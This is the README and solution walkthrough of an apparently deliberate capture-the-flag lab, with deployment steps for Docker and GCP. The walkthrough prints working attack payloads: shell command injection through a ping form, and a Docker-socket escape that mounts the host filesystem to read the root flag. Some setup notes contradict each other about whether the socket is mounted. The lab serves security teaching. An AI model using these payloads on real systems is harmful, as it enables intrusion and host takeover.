Run

```powershell
# (recommended) let the GCP startup script provision runtime secrets and start the lab
# from the instance: gcp-startup.sh will set DEV_PORTAL_TOKEN and SECRET_KEY at runtime.
docker compose up -d --build
```

Open the portal at:

```text
http://localhost
```

The leaked backup is available at:

```text
http://localhost/.env.bak
```

## Reset

```powershell
docker compose down -v --remove-orphans
```

## Production / Multi-tenant Guidance

- This repository defaults to a *secure* runtime mode. The vulnerable behavior is gated by an environment variable `LAB_MODE` which defaults to `secure`.
- The docker compose file no longer mounts the host Docker socket. That mount is dangerous on multi-tenant hosts; the lab preserves the learning objectives while avoiding host socket escalation by default.
- Runtime secrets (portal token, flags, flask `SECRET_KEY`) are generated at instance startup by `gcp-startup.sh`. Do not commit real secrets to VCS. Files under `app/static/.env.bak` and `app/flags/` are ignored by `.gitignore`.
- Container runtime hardening applied:
	- non-root `appuser` in the web image
	- read-only root filesystem for the web container
	- dropped capabilities except `NET_RAW` (ping needs this)
	- `no-new-privileges` enabled

Use the `gcp-startup.sh` bootstrap for GCE instances (Ubuntu 22.04). If you want, I can provide a `gcloud compute instances create` command that injects `gcp-startup.sh` as the startup script and creates appropriate firewall rules and network tags.

## Create a golden image for students

Recommended workflow to build a reusable image that initializes uniquely on each student's first boot.

1. Set variables (replace placeholders):

```bash
PROJECT=YOUR_PROJECT_ID
ZONE=us-central1-a
BUILD_INSTANCE=overlap-build-vm
IMAGE_NAME=overlap-lab-image-$(date +%Y%m%d)
BUCKET=overlap-lab-images
```

2. Create a Cloud Storage bucket to export the image (optional):

```bash
gsutil mb -p $PROJECT gs://$BUCKET
```

3. Create a build VM that runs the startup script in image-build mode. This will install Docker, clone the repo, and prepare a first-boot systemd service that generates fresh flags and secrets at first boot for each student instance. The build VM will NOT bake secrets into the disk.

```bash
gcloud compute instances create $BUILD_INSTANCE \
	--project=$PROJECT \
	--zone=$ZONE \
	--machine-type=e2-medium \
	--image-family=ubuntu-2204-lts \
	--image-project=ubuntu-os-cloud \
	--boot-disk-size=50GB \
	--tags=overlap-ssh \
	--metadata=IMAGE_BUILD=1 \
	--metadata-from-file=startup-script=gcp-startup.sh
```

4. Wait for the startup script to finish and verify via the startup log:

```bash
gcloud compute ssh $BUILD_INSTANCE --zone=$ZONE --project=$PROJECT --command "sudo tail -n 200 /var/log/overlap-startup.log"
# look for: "Image build prep complete."
```

5. Stop the build VM and create a reusable image from its boot disk:

```bash
gcloud compute instances stop $BUILD_INSTANCE --zone=$ZONE --project=$PROJECT

gcloud compute images create $IMAGE_NAME \
	--project=$PROJECT \
	--source-disk=$BUILD_INSTANCE \
	--source-disk-zone=$ZONE \
	--family=overlap-labs
```

6. (Optional) Export the image to Cloud Storage so you can publish a download link to students:

```bash
gcloud compute images export --image=$IMAGE_NAME --destination-uri=gs://$BUCKET/$IMAGE_NAME.tar.gz --project=$PROJECT

# Make the exported tarball public (only do this if you intend the image to be publicly downloadable)
gsutil acl ch -u AllUsers:R gs://$BUCKET/$IMAGE_NAME.tar.gz
```

7. Give students instructions to instantiate the image in their projects (example):

```bash
gcloud compute instances create student-overlap-1 \
	--project=$PROJECT \
	--zone=$ZONE \
	--machine-type=e2-medium \
	--image=$IMAGE_NAME \
	--image-project=$PROJECT \
	--tags=overlap-http,overlap-ssh \
	--metadata=LAB_MODE=vulnerable
```

Notes:

- The image contains a first-boot service that generates a unique portal token and flags when a student boots an instance from the image.
- Keep the exported image private unless you intentionally want a public download link.
- To run the vulnerable lab behavior, set `LAB_MODE=vulnerable` in your instance metadata.

## Reset

```powershell
docker compose down -v --remove-orphans
```

## Notes

- The Docker socket mount is intentional for the lab.
- The final "host" root is simulated with a named volume so the exercise stays isolated.
--

## Solution Walkthrough

This section provides a concise step-by-step solution to the four phases of the lab. The walkthrough assumes the lab is running and reachable at `http://<HOST>` (replace `<HOST>` with the VM external IP or `localhost` for local runs). If you want the full pivot (Phase 3) to be possible from inside the web container, start the stack with the optional override: `docker compose -f docker-compose.yml -f docker-compose.vuln.yml up -d --build`.

1) Phase 1 — The Lazy Dev Leak

	- Retrieve the leaked backup file from the site root:

		```bash
		curl http://<HOST>/.env.bak
		```

	- You should see `DEV_PORTAL_TOKEN=...` and a phase-1 flag line. Note the token — it unlocks the portal.

2) Phase 2 — Command Injection via the Management Portal

	- Open `http://<HOST>/login` in your browser and paste the `DEV_PORTAL_TOKEN` value into the Portal token field and click "Unlock" (or submit via HTTP):

		```bash
		# save cookies and login (example)
		curl -c cookies.txt -d "token=<DEV_PORTAL_TOKEN>" -X POST http://<HOST>/login
		```

	- After login, the System Diagnostic is at `http://<HOST>/portal`. The form accepts a target and (in vulnerable mode) passes it straight to a shell `ping` command. Use metacharacters to execute a second command and read the Phase 2 flag:

		```bash
		# Example (uses the saved session cookie):
		curl -b cookies.txt -d "ip=127.0.0.1; cat /app/flags/phase2.txt" -X POST http://<HOST>/portal
		```

	- The command output returned by the diagnostic should include the Phase 2 flag string.

	- You can also use a discovery payload to prove you are inside a container:

		```text
		127.0.0.1; ls -la /.dockerenv || cat /proc/1/cgroup
		```

		If you see a `.dockerenv` file or docker-related cgroup entries, the process runs inside a container.

3) Phase 3 — Docker Socket Pivot (optional; requires `docker-compose.vuln.yml`)

	- The default secure stack does not expose the host Docker socket. To enable the pivot step (for isolated training environments), bring the stack up with the vulnerability override:

		```bash
		docker compose -f docker-compose.yml -f docker-compose.vuln.yml up -d --build
		```

	- Confirm the socket is visible from the web container (you can use the diagnostic injection to run checks):

		```bash
		# from your authenticated session, run a test to list the socket
		curl -b cookies.txt -d "ip=127.0.0.1; ls -la /var/run/docker.sock" -X POST http://<HOST>/portal
		```

	- If `/var/run/docker.sock` exists, you can use the Docker Engine HTTP API over the Unix socket to create a helper container that mounts the host filesystem and reads the host-root flag. Example sequence (these are the equivalent curl steps that can be executed from inside the web container or via a command-injection payload):

		```bash
		# create a container named exploit that mounts host / to /mnt and runs cat on the host's root flag
		curl -s --unix-socket /var/run/docker.sock -H "Content-Type: application/json" \
			-d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /mnt/root/root.txt"],"HostConfig":{"Binds":["/:/mnt:ro"]}}' \
			-X POST http://localhost/v1.41/containers/create?name=exploit

		# start the container
		curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/exploit/start

		# read the output (logs) from the container which should contain the host flag
		curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/containers/exploit/logs?stdout=1&stderr=1
		```

	- The output should include the host/root flag (the final flag for the chain).

4) Phase 4 — Host Takeover Claim

	- After the successful container run that mounts the host filesystem, the host root flag is reachable at `/root/root.txt` inside the mounted tree. The previous `curl` logs request returns that value.

Instructor notes (quick)

	- Use the provided `docker-compose.vuln.yml` only on isolated lab hosts where you intend to allow the socket pivot. The default `docker-compose.yml` is configured for safer operation and does not expose the Docker socket.
	- If you want to temporarily enable the socket on a running deployment, add the volume and `LAB_MODE=vulnerable` to the `web` service and then recreate the service.

Troubleshooting

	- If the Phase 2 diagnostic returns no useful output, ensure you are authenticated (session cookie) and that the `ip` field is submitted exactly as shown (metacharacters need to be URL-encoded if you use them in scripts).
	- If the Docker API calls fail when the socket is mounted, verify that the host's Docker daemon has the required images (the `alpine` image is used by the helper container — it will generally be present because the seed services use alpine).
